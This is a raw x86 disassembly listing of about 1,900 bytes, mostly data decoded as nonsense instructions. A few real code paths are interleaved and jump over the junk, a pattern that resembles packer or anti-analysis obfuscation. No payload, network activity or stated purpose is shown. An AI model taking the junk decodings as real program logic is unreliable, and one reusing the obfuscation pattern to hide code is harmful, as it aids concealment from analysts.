  40e998:	adc    DWORD PTR [edx],ebp
  40e99a:	sbb    eax,0x19dd9c96
  40e99f:	mov    BYTE PTR [ebx-0x23],0x35
  40e9a3:	(bad)  
  40e9a4:	cdq    
  40e9a5:	jp     0x40e932
  40e9a7:	add    bl,BYTE PTR [edx+0x33]
  40e9aa:	imul   esi
  40e9ac:	(bad)  
  40e9ae:	mov    ebp,0xe7d32b44
  40e9b3:	cs ds push esi
  40e9b6:	push   0x74
  40e9b8:	jge    0x40e9c6
  40e9ba:	or     ebp,DWORD PTR [ecx+ebp*8]
  40e9bd:	add    eax,0xabf32326
  40e9c2:	mov    esp,DWORD PTR ds:[eax+edi*2+0x105b9c93]
  40e9ca:	mov    bl,dl
  40e9cc:	xor    DWORD PTR [edx-0x2f],edi
  40e9cf:	ror    DWORD PTR [ebx],1
  40e9d1:	out    dx,al
  40e9d2:	retf   
  40e9d3:	pop    esp
  40e9d4:	mov    edi,0x55515984
  40e9d9:	xchg   edx,eax
  40e9da:	jb     0x40ea11
  40e9dc:	jns    0x40ea21
  40e9de:	xor    ah,cl
  40e9e0:	loop   0x40e968
  40e9e2:	aas    
  40e9e3:	sar    ch,cl
  40e9e5:	xchg   esp,eax
  40e9e6:	add    bh,BYTE PTR [edx+0x3e580fab]
  40e9ec:	inc    edi
  40e9ed:	xor    BYTE PTR [eax],cl
  40e9ef:	ss sub eax,0xa52c54eb
  40e9f5:	mov    eax,ds:0x682b124e
  40e9fa:	dec    eax
  40e9fb:	xchg   edi,eax
  40e9fc:	cmp    cl,BYTE PTR [ebx+0x21]
  40e9ff:	inc    edx
  40ea00:	cmc    
  40ea01:	(bad)  
  40ea02:	shl    BYTE PTR [ebx+0x4d44b34c],1
  40ea08:	cld    
  40ea09:	icebp  
  40ea0a:	jne    0x40e9e7
  40ea0c:	call   0x7f2d445f
  40ea11:	xchg   bh,ch
  40ea13:	jmp    0x8a6b:0x8be0904b
  40ea1a:	jp     0x40ea4d
  40ea1c:	ds jge 0x40ea2b
  40ea1f:	sub    al,0xce
  40ea21:	idiv   DWORD PTR [esp+esi*8+0x31]
  40ea25:	lahf   
  40ea26:	mov    cl,BYTE PTR [ecx]
  40ea28:	pop    esi
  40ea29:	jae    0x40ea75
  40ea2b:	stos   DWORD PTR es:[edi],eax
  40ea2c:	adc    eax,0xa731e075
  40ea31:	adc    bh,BYTE PTR [eax]
  40ea33:	pop    es
  40ea34:	mov    al,ds:0x372ca5d9
  40ea39:	jo     0x40eab9
  40ea3b:	stos   BYTE PTR es:[edi],al
  40ea3c:	ds fs dec ecx
  40ea3f:	imul   esp,esp,0xc79e6fe8
  40ea45:	and    esp,DWORD PTR [esp+ebp*4-0x41]
  40ea49:	lods   al,BYTE PTR ds:[esi]
  40ea4a:	adc    eax,0xa99258a7
  40ea4f:	sub    BYTE PTR [ebp-0x7e3b35d5],ah
  40ea55:	sti    
  40ea56:	add    al,0x88
  40ea58:	aam    0xc9
  40ea5a:	mov    bl,0x57
  40ea5c:	adc    eax,0x70e53019
  40ea61:	lea    esi,[esi-0x5d76ba36]
  40ea67:	fld    TBYTE PTR [ecx]
  40ea69:	inc    edx
  40ea6a:	push   edx
  40ea6b:	pop    es
  40ea6c:	mov    dh,BYTE PTR [esi]
  40ea6e:	sub    al,0xc0
  40ea70:	pop    ecx
  40ea71:	aas    
  40ea72:	inc    ebx
  40ea73:	rep outs dx,DWORD PTR ds:[esi]
  40ea75:	clc    
  40ea76:	add    dl,al
  40ea78:	out    0x48,eax
  40ea7a:	js     0x40eada
  40ea7c:	mov    dl,BYTE PTR [ebp-0x31]
  40ea7f:	pop    esp
  40ea80:	sbb    ch,dl
  40ea82:	xor    edi,DWORD PTR [esi-0x40dc3c67]
  40ea88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea89:	inc    esi
  40ea8a:	lahf   
  40ea8b:	mov    eax,DWORD PTR ss:[ebp-0x68]
  40ea8f:	xchg   BYTE PTR [ebx],cl
  40ea91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea92:	mov    esi,0x8f58def2
  40ea97:	repnz mov edx,0x4a6979b5
  40ea9d:	cli    
  40ea9e:	scas   eax,DWORD PTR es:[edi]
  40ea9f:	popf   
  40eaa0:	sbb    eax,0xa6850f4c
  40eaa5:	add    BYTE PTR [eax],al
  40eaa7:	add    BYTE PTR [ebx],al
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	in     eax,0xfc
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x16
  40eb8d:	or     bl,ch
  40eb8f:	jmp    0x40eb88
  40eb91:	scas   eax,DWORD PTR es:[edi]
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40eb2f
  40eb99:	push   ecx
  40eb9a:	xchg   ebp,eax
  40eb9b:	addr16 pop edx
  40eb9d:	adc    DWORD PTR [ecx],edi
  40eb9f:	std    
  40eba0:	dec    eax
  40eba1:	ins    BYTE PTR es:[edi],dx
  40eba2:	(bad)  
  40eba3:	cmc    
  40eba4:	fmul   st(1),st
  40eba6:	jne    0x40eb93
  40eba8:	test   DWORD PTR [eax-0x9],edi
  40ebab:	fidivr DWORD PTR [esi+0x3c7d882d]
  40ebb1:	call   FWORD PTR [eax+0x24]
  40ebb4:	xlat   BYTE PTR ds:[ebx]
  40ebb5:	jae    0x40eba7
  40ebb7:	xor    al,BYTE PTR [edx+0x79]
  40ebba:	pushf  
  40ebbb:	adc    ah,bh
  40ebbd:	xchg   edx,eax
  40ebbe:	out    dx,eax
  40ebbf:	add    al,0x9b
  40ebc1:	inc    ecx
  40ebc2:	dec    eax
  40ebc3:	je     0x40ec2b
  40ebc5:	xor    eax,0xac8219d9
  40ebca:	in     al,dx
  40ebcb:	mov    eax,ds:0x2a48129
  40ebd0:	inc    eax
  40ebd1:	mov    ch,ah
  40ebd3:	into   
  40ebd4:	mov    ebp,0x1e6cab24
  40ebd9:	(bad)
  40ebdd:	mov    bl,0xbe
  40ebdf:	and    dl,BYTE PTR [edx]
  40ebe1:	cwde   
  40ebe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebe3:	ja     0x40ec06
  40ebe5:	adc    DWORD PTR [edi+0x76724f43],ebp
  40ebeb:	into   
  40ebec:	inc    esp
  40ebed:	add    BYTE PTR [edi*2+0x2361b220],ah
  40ebf4:	jne    0x40ebff
  40ebf6:	sbb    al,0xd1
  40ebf8:	je     0x40ebcd
  40ebfa:	loop   0x40ebfb
  40ebfc:	or     al,0x38
  40ebfe:	popa   
  40ebff:	cwde   
  40ec00:	xor    eax,0x311e302c
  40ec05:	ret    
  40ec06:	outs   dx,DWORD PTR ds:[esi]
  40ec07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec08:	xchg   edx,eax
  40ec09:	jp     0x40ec73
  40ec0b:	retf   0xed0f
  40ec0e:	jno    0x40ec5b
  40ec10:	sbb    BYTE PTR [esi+0x25dee036],dh
  40ec16:	frstor [edx+0x74]
  40ec19:	xchg   edi,eax
  40ec1a:	mov    edi,0xb74448eb
  40ec1f:	inc    ecx
  40ec20:	ret    0xb288
  40ec23:	mov    cl,0x6e
  40ec25:	jmp    0x40ec4e
  40ec27:	scas   eax,DWORD PTR es:[edi]
  40ec28:	pop    edi
  40ec29:	pop    edx
  40ec2a:	out    0xb8,eax
  40ec2c:	xor    edi,eax
  40ec2e:	adc    BYTE PTR [esi-0x21],bl
  40ec31:	mov    ecx,0x3c38c340
  40ec36:	mov    BYTE PTR [ecx],bh
  40ec38:	es and al,0x2e
  40ec3b:	out    0x71,al
  40ec3d:	add    BYTE PTR ds:0x3b466908,0xc2
  40ec44:	dec    esp
  40ec45:	repnz mov edi,0xd70feb1d
  40ec4b:	push   edx
  40ec4c:	dec    esp
  40ec4d:	sbb    bl,BYTE PTR [edi]
  40ec4f:	test   al,0x50
  40ec51:	jno    0x40ebe9
  40ec53:	sar    al,0xb8
  40ec56:	add    BYTE PTR [esi],ch
  40ec58:	and    al,0xa6
  40ec5a:	(bad)  
  40ec5b:	fild   QWORD PTR [esi-0x2c]
  40ec5e:	rol    BYTE PTR [ebx-0x45],0xc2
  40ec62:	(bad)  
  40ec63:	ror    DWORD PTR [edi],1
  40ec65:	cmp    ah,BYTE PTR [ecx]
  40ec67:	(bad)  
  40ec68:	mov    cl,BYTE PTR [edi]
  40ec6a:	test   eax,0xe610c732
  40ec6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec70:	pop    eax
  40ec71:	retf   0x633c
  40ec74:	sbb    ebx,esi
  40ec76:	add    cl,BYTE PTR [esi]
  40ec78:	stc    
  40ec79:	outs   dx,DWORD PTR ds:[esi]
  40ec7a:	es in  al,0x7f
  40ec7d:	mov    ecx,0x54b983d7
  40ec82:	xor    DWORD PTR [ecx-0x74],ecx
  40ec85:	fist   WORD PTR ds:0x2172fd27
  40ec8b:	mov    eax,ds:0x46ca175c
  40ec90:	stos   BYTE PTR es:[edi],al
  40ec91:	shl    esp,0xe2
  40ec94:	push   0x1c
  40ec96:	jmp    0x40ecbd
  40ec98:	adc    al,ah
  40ec9a:	addr16 sub dh,ch
  40ec9d:	int3   
  40ec9e:	jne    0x40ecd5
  40eca0:	xchg   ecx,eax
  40eca1:	adc    eax,0x4879a590
  40eca6:	retf   
  40eca7:	push   0xffffffa6
  40eca9:	xchg   esp,eax
  40ecaa:	ret    0xe43b
  40ecad:	jmp    0x13e:0x93b3c729
  40ecb4:	xchg   ecx,eax
  40ecb5:	dec    ecx
  40ecb6:	fsub   st(2),st
  40ecb8:	ss (bad) 
  40ecbb:	call   0xa84:0xc750003e
  40ecc2:	or     bh,ch
  40ecc4:	xchg   ebx,eax
  40ecc5:	arpl   WORD PTR [ecx],bx
  40ecc7:	pop    edi
  40ecc8:	aad    0x8f
  40ecca:	pushf  
  40eccb:	cdq    
  40eccc:	rol    DWORD PTR [ecx-0x2ebace64],0xe1
  40ecd3:	pop    ebx
  40ecd4:	mov    WORD PTR [esi+0x60],cs
  40ecd7:	cmp    cl,BYTE PTR [ebp+0x3]
  40ecda:	adc    BYTE PTR [edi+0x77],bh
  40ecdd:	repz sbb bh,BYTE PTR [ebp+eax*4+0x7b]
  40ece2:	cwde   
  40ece3:	xchg   edx,eax
  40ece4:	aaa    
  40ece5:	cmp    eax,ecx
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed15
  40ed00:	mov    WORD PTR [eax],cs
  40ed02:	je     0x40ecbe
  40ed04:	scas   al,BYTE PTR es:[edi]
  40ed05:	jo     0x40ed77
  40ed07:	ret    
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed7d
  40ed0c:	or     eax,0x75124848
  40ed11:	jnp    0x40ecf0
  40ed13:	out    dx,al
  40ed14:	repnz in eax,0xaa
  40ed17:	call   0xe244:0xfe6ed8c1
  40ed1e:	imul   ecx,DWORD PTR [ebp+0x568ec70f],0xeecb2437
  40ed28:	cwde   
  40ed29:	xor    esp,esp
  40ed2b:	xor    DWORD PTR [edi+0x1b212feb],ecx
  40ed31:	jae    0x40eda1
  40ed33:	mov    WORD PTR [ebx+0x58adff7e],ss
  40ed39:	adc    dl,BYTE PTR [ebx-0x41dd0f1f]
  40ed3f:	neg    DWORD PTR ds:0x594598fe
  40ed45:	xor    DWORD PTR [esi+0x64],esi
  40ed48:	jmp    0x40ed3e
  40ed4a:	sbb    al,0xb6
  40ed4c:	add    DWORD PTR [edx+eax*4+0x571e9055],0xe796349c
  40ed57:	and    esi,eax
  40ed59:	xor    edi,DWORD PTR ds:0x986fc3a9
  40ed5f:	push   ds
  40ed60:	pushf  
  40ed61:	pop    edi
  40ed62:	lds    ebp,FWORD PTR [eax-0x5e]
  40ed65:	into   
  40ed66:	sub    eax,0x6687ba61
  40ed6b:	cmp    ebp,ecx
  40ed6d:	inc    esi
  40ed6e:	dec    eax
  40ed6f:	jns    0x40ed7a
  40ed71:	outs   dx,DWORD PTR ds:[esi]
  40ed72:	cmp    cl,ch
  40ed74:	cmc    
  40ed75:	jl     0x40ed5d
  40ed77:	das    
  40ed78:	lods   al,BYTE PTR ds:[esi]
  40ed79:	call   0xf77c4265
  40ed7e:	les    edx,FWORD PTR [ecx+0x6e]
  40ed81:	and    ch,BYTE PTR [eax+0x41a98f5a]
  40ed87:	or     ebx,DWORD PTR [edi]
  40ed89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed8a:	pop    esp
  40ed8b:	repnz mov edi,eax
  40ed8e:	push   ebx
  40ed8f:	inc    edx
  40ed90:	test   al,0xe4
  40ed92:	rol    BYTE PTR [ebx],1
  40ed94:	imul   esi,DWORD PTR [edx],0x257d16b7
  40ed9a:	loop   0x40ed71
  40ed9c:	pop    ds
  40ed9d:	sti    
  40ed9e:	push   es
  40ed9f:	shl    DWORD PTR [ebp-0xb],1
  40eda2:	and    DWORD PTR [edi],ecx
  40eda4:	repnz xchg ebx,eax
  40eda6:	fld    QWORD PTR [ecx-0x11716d2d]
  40edac:	cmc    
  40edad:	pop    ecx
  40edae:	dec    ecx
  40edaf:	mov    BYTE PTR [esp+eiz*8],ch
  40edb2:	sub    BYTE PTR [ebp-0x4c],cl
  40edb5:	add    al,0x55
  40edb7:	inc    esp
  40edb8:	popa   
  40edb9:	push   ss
  40edba:	xchg   bh,al
  40edbc:	leave  
  40edbd:	sbb    al,0x9b
  40edbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edc0:	aam    0x41
  40edc2:	jmp    0x70bc5063
  40edc7:	adc    DWORD PTR fs:[edi+0x57],esi
  40edcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edcc:	push   ebp
  40edcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edce:	rol    DWORD PTR [ebx],0x1c
  40edd1:	jns    0x40ede7
  40edd3:	add    BYTE PTR [ecx-0x3ade3939],dl
  40edd9:	pop    es
  40edda:	lea    ebx,[ebx+0x75367324]
  40ede0:	fld    TBYTE PTR [edx]
  40ede2:	cmp    edi,ecx
  40ede4:	(bad)  
  40ede5:	xchg   ebp,eax
  40ede6:	mov    dl,0xb6
  40ede8:	ffreep st(7)
  40edea:	sti    
  40edeb:	mov    dh,0xaa
  40eded:	fcomp  DWORD PTR [ecx+ecx*1+0x12]
  40edf1:	inc    ebx
  40edf2:	jo     0x40ee11
  40edf4:	mov    ecx,0xf2ddea7d
  40edf9:	mov    esp,0x7f95db6
  40edfe:	idiv   DWORD PTR [edx+0x64207c90]
  40ee04:	or     ah,BYTE PTR [edx]
  40ee06:	adc    al,0x39
  40ee08:	repz mov ah,0x84
  40ee0b:	aad    0x43
  40ee0d:	dec    ebx
  40ee0e:	loope  0x40eda9
  40ee10:	pop    es
  40ee11:	add    eax,0x1061a755
  40ee16:	dec    ebx
  40ee17:	sbb    edx,esp
  40ee19:	lds    esp,FWORD PTR ds:0x4f59850
  40ee1f:	imul   ecx,DWORD PTR [edi+ebx*8],0x1f
  40ee23:	mov    eax,ds:0xfb304484
  40ee28:	push   0x52b76285
  40ee2d:	add    esp,ebx
  40ee2f:	mov    al,bl
  40ee31:	dec    eax
  40ee32:	rcr    BYTE PTR [esp+esi*8+0x55008e94],1
  40ee39:	test   al,0x70
  40ee3b:	add    dl,ah
  40ee3d:	(bad)  
  40ee3e:	cli    
  40ee3f:	lds    eax,FWORD PTR [eax-0x57a2927c]
  40ee45:	daa    
  40ee46:	mov    eax,DWORD PTR [edi-0x56828d98]
  40ee4c:	jbe    0x40ee89
  40ee4e:	jmp    0xf2bc:0x8f61ef3b
  40ee55:	(bad)  
  40ee56:	jp     0x40ee65
  40ee58:	jg     0x40efd7
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0xa8
  40ee7f:	jmp    0x40eea2
  40ee81:	icebp  
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee15
  40ee8b:	leave  
  40ee8c:	jecxz  0x40ee70
  40ee8e:	adc    DWORD PTR [ebx+0x46],0x57
  40ee92:	jae    0x40ee5a
  40ee94:	push   ds
  40ee95:	mov    dh,0x1
  40ee97:	xor    ch,BYTE PTR [edx+0xa]
  40ee9a:	repz mov edx,0x23bc3d8c
  40eea0:	loope  0x40ee53
  40eea2:	mov    dh,0xf
  40eea4:	pusha  
  40eea5:	iret   
  40eea6:	and    ah,BYTE PTR [ebp+ebx*1-0x4e]
  40eeaa:	es cdq 
  40eeac:	sbb    DWORD PTR [eax+edx*1-0x39],edi
  40eeb0:	stos   BYTE PTR es:[edi],al
  40eeb1:	xchg   ebx,eax
  40eeb2:	or     al,BYTE PTR [edi+0x55]
  40eeb5:	mov    al,0x74
  40eeb7:	cdq    
  40eeb8:	or     ebx,ebx
  40eeba:	mov    bl,0xe7
  40eebc:	leave  
  40eebd:	dec    eax
  40eebe:	(bad)  
  40eebf:	in     al,0x8f
  40eec1:	ins    BYTE PTR es:[edi],dx
  40eec2:	stos   BYTE PTR es:[edi],al
  40eec3:	or     BYTE PTR [esi+ebp*1],bh
  40eec6:	ins    BYTE PTR es:[edi],dx
  40eec7:	jmp    0x6c7e8438
  40eecc:	cld    
  40eecd:	pop    es
  40eece:	pop    ebx
  40eecf:	ja     0x40ef35
  40eed1:	push   edi
  40eed2:	rcr    DWORD PTR [ecx],1
  40eed4:	int3   
  40eed5:	fsincos 
  40eed7:	fsubr  QWORD PTR [edx-0x29]
  40eeda:	inc    esp
  40eedb:	jl     0x40ef31
  40eedd:	rcl    BYTE PTR [ebp-0x3029d3fc],cl
  40eee3:	mov    ch,0xd4
  40eee5:	imul   eax,DWORD PTR [esi],0xffffffbb
  40eee8:	hlt    
  40eee9:	mov    ebx,0xd83818c1
  40eeee:	mov    eax,0x4354c750
  40eef3:	test   esi,ecx
  40eef5:	push   ecx
  40eef6:	scas   eax,DWORD PTR es:[edi]
  40eef7:	xor    al,0xbb
  40eef9:	es mov ecx,ecx
  40eefc:	cmp    DWORD PTR [edx],esp
  40eefe:	push   esi
  40eeff:	imul   ecx,ebp,0x6fafb1f0
  40ef05:	jbe    0x40eef6
  40ef07:	jmp    0x67b7:0x8418b1b6
  40ef0e:	lods   eax,DWORD PTR ds:[esi]
  40ef0f:	pop    ebp
  40ef10:	jne    0x40ee9c
  40ef12:	mov    dl,0x40
  40ef14:	push   edi
  40ef15:	scas   eax,DWORD PTR es:[edi]
  40ef16:	push   ebp
  40ef17:	push   ecx
  40ef18:	inc    eax
  40ef19:	and    eax,ebx
  40ef1b:	push   edi
  40ef1c:	xchg   DWORD PTR [eax],edi
  40ef1e:	shl    DWORD PTR [esi+0x4a],1
  40ef21:	add    ax,ax
  40ef24:	sbb    BYTE PTR [edi+eax*2+0x2f],dh
  40ef28:	mov    ah,0x2b
  40ef2a:	jge    0x40eee7
  40ef2c:	cdq    
  40ef2d:	push   ds
  40ef2e:	cmp    BYTE PTR [esi+eax*1-0x62],0x99
  40ef33:	sub    edx,DWORD PTR [ecx+0x13399d2b]
  40ef39:	jnp    0x40ef7c
  40ef3b:	adc    BYTE PTR ds:0x4c1eca4e,ah
  40ef41:	xchg   DWORD PTR [esi],edi
  40ef43:	sub    ah,ch
  40ef45:	mov    ebp,0x499c4b6d
  40ef4a:	hlt    
  40ef4b:	push   cs
  40ef4c:	inc    ebp
  40ef4d:	les    ebp,FWORD PTR [edi+ecx*2-0xb]
  40ef51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef53:	inc    edx
  40ef54:	mov    al,0xfd
  40ef56:	in     al,0xf3
  40ef58:	jmp    0x40ef33
  40ef5a:	cmp    al,BYTE PTR [ebx-0x36]
  40ef5d:	pop    esi
  40ef5e:	mov    ebx,0x130ae111
  40ef63:	xor    cl,BYTE PTR [edi+ebp*1+0x44c7496f]
  40ef6a:	mov    bh,0x16
  40ef6c:	mov    esi,DWORD PTR [ebp+0x4a]
  40ef6f:	(bad)  
  40ef70:	shl    BYTE PTR [esi*4-0x58d67efc],cl
  40ef77:	shl    BYTE PTR [ecx],1
  40ef79:	add    esi,0x320cc658
  40ef7f:	stc    
  40ef80:	arpl   WORD PTR [eax],di
  40ef82:	cdq    
  40ef83:	iret   
  40ef84:	int    0x4c
  40ef86:	cmp    eax,0xa01372e0
  40ef8b:	push   cs
  40ef8c:	fcomp  DWORD PTR [ecx]
  40ef8e:	adc    al,0x89
  40ef90:	sar    BYTE PTR [eax],cl
  40ef92:	loopne 0x40ef47
  40ef94:	pop    esp
  40ef95:	mov    al,ds:0x4ff0a222
  40ef9a:	xor    BYTE PTR [ebx-0x434ca685],bl
  40efa0:	retf   0xe7b9
  40efa3:	sbb    al,0xa8
  40efa5:	fcomp  DWORD PTR [ebx+0x4167faa]
  40efab:	jo     0x40ef6c
  40efad:	push   edi
  40efae:	retf   
  40efaf:	push   ss
  40efb0:	dec    edi
  40efb1:	call   DWORD PTR [ecx]
  40efb3:	fsub   st(0),st
  40efb5:	sub    al,0x10
  40efb7:	or     BYTE PTR [ebp+0x3ea1bca3],bl
  40efbd:	lods   al,BYTE PTR ds:[esi]
  40efbe:	lea    esp,[ebp+0x6d]
  40efc1:	stos   DWORD PTR es:[edi],eax
  40efc2:	and    bl,BYTE PTR [ecx+eax*2+0x5f4824ae]
  40efc9:	or     BYTE PTR [ebx],dh
  40efcb:	ins    BYTE PTR es:[edi],dx
  40efcc:	(bad)  
  40efcd:	fld    QWORD PTR [edi]
  40efcf:	push   0xa4b2f093
  40efd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efd5:	mov    bh,BYTE PTR [edi+0x33]
  40efd8:	(bad)  
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	xor    DWORD PTR [esi+eiz*2+0x70abd079],0x707fc370
  40f005:	jo     0x40f079
  40f007:	dec    ebx
  40f008:	rcr    BYTE PTR [edi],0x84
  40f00b:	les    esp,FWORD PTR [edx-0x7d]
  40f00e:	push   ebx
  40f00f:	jne    0x40f03e
  40f011:	sar    BYTE PTR [ecx+0x7a35b8f3],1
  40f017:	daa    
  40f018:	rcl    DWORD PTR [edx-0x7ffcca01],1
  40f01e:	pop    ebp
  40f01f:	bound  edx,QWORD PTR [eax]
  40f021:	mov    ebp,gs
  40f023:	mov    dh,0xeb
  40f025:	out    dx,eax
  40f026:	mov    esp,0x900e1d88
  40f02b:	inc    ecx
  40f02c:	mov    eax,ds:0x54d0da54
  40f031:	or     esi,edx
  40f033:	je     0x40f083
  40f035:	test   BYTE PTR [ecx+edi*4],dh
  40f038:	jae    0x40f02c
  40f03a:	dec    ecx
  40f03b:	pop    ds
  40f03c:	ret    0xddad
  40f03f:	jl     0x40efd1
  40f041:	sub    eax,0x947094ba
  40f046:	cmp    BYTE PTR [edx],0x47
  40f049:	xor    BYTE PTR [ecx+0x35dd6504],0x7b
  40f050:	and    cl,dl
  40f052:	and    DWORD PTR [ebp+eiz*1-0x47],edx
  40f056:	call   0xe43e:0xfa720596
  40f05d:	imul   edx,DWORD PTR [ebx+0x52],0x20
  40f061:	cdq    
  40f062:	add    bh,BYTE PTR [esi-0x46a46543]
  40f068:	(bad)  
  40f069:	mov    ebp,0x978f463e
  40f06e:	rol    BYTE PTR [edi-0x4],0xc3
  40f072:	aaa    
  40f073:	pop    eax
  40f074:	scas   al,BYTE PTR es:[edi]
  40f075:	jno    0x40f035
  40f077:	push   0x8075bdb5
  40f07c:	jmp    0xaa39:0x943699f1
  40f083:	out    dx,eax
  40f084:	mov    ah,0xce
  40f086:	iret   
  40f087:	aam    0x94
  40f089:	mov    ds:0x444e4675,al
  40f08e:	leave  
  40f08f:	dec    esp
  40f090:	in     eax,dx
  40f091:	push   ebp
  40f092:	or     al,0xe8
  40f094:	cdq    
  40f095:	inc    edi
  40f096:	xchg   BYTE PTR [eax+0x4c5e68e1],dl
  40f09c:	adc    ecx,esp
  40f09e:	or     BYTE PTR [eax],ah
  40f0a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0a1:	push   0xffffffaf
  40f0a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0a4:	je     0x40f10d
  40f0a6:	inc    ebx
  40f0a7:	sub    ecx,DWORD PTR [ebx+0x33]
  40f0aa:	push   cs
  40f0ab:	push   ebp
  40f0ac:	push   eax
  40f0ad:	mov    ebx,DWORD PTR [eax]
  40f0af:	xchg   esp,eax
  40f0b0:	retf   0x901e
  40f0b3:	mov    bl,0x9a
  40f0b5:	int3   
  40f0b6:	cmp    eax,0x21
  40f0b9:	xchg   edx,eax
  40f0ba:	mov    eax,0x9f5f56c9
  40f0bf:	test   eax,0x400e7fae
  40f0c4:	or     ecx,DWORD PTR [eax+0x44514723]
  40f0ca:	dec    ebp
  40f0cb:	jo     0x40f08d
  40f0cd:	sbb    ebx,esp
  40f0cf:	jae    0x40f0a3
  40f0d1:	jp     0x40f095
  40f0d3:	imul   eax,DWORD PTR [esi-0x3e],0x1c9d6376
  40f0da:	in     eax,0x1f
  40f0dc:	push   edx
  40f0dd:	pop    edx
  40f0de:	or     ah,BYTE PTR [ecx]
  40f0e0:	shl    DWORD PTR [eax+0x32],1
  40f0e3:	mov    bh,0x51
  40f0e5:	jg     0x40f0c2
  40f0e7:	or     BYTE PTR [esi],ch
  40f0e9:	xchg   esi,eax
  40f0ea:	fs out dx,al
  40f0ec:	rcr    DWORD PTR [ebx+0xb],1
  40f0ef:	pop    ss
  40f0f0:	cmc    
  40f0f1:	test   DWORD PTR [eax+0x3a],eax
  40f0f4:	xchg   ebx,eax
  40f0f5:	mov    al,ds:0x71ceae92
  40f0fa:	cmp    bl,BYTE PTR [esi+0x2e]
  40f0fd:	scas   al,BYTE PTR es:[edi]
  40f0fe:	lock mov dh,0x29
  40f101:	xchg   edx,eax
  40f102:	xor    ebp,DWORD PTR [eax]
  40f104:	mov    esp,0xf3a04d86
  40f109:	cwde   
  40f10a:	and    DWORD PTR [edi],esp
